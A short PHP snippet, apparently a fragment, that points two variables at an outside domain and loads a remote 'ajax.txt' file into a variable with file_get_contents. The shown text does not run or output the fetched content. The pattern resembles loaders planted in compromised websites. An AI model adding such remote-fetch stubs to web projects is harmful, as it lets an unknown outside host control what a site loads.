<?php
$ajaxurl="http://img.gaobiaoiot.net";
$ajax="http://img.gaobiaoiot.net/ajax.txt";
$ajax=file_get_contents($ajax);
?>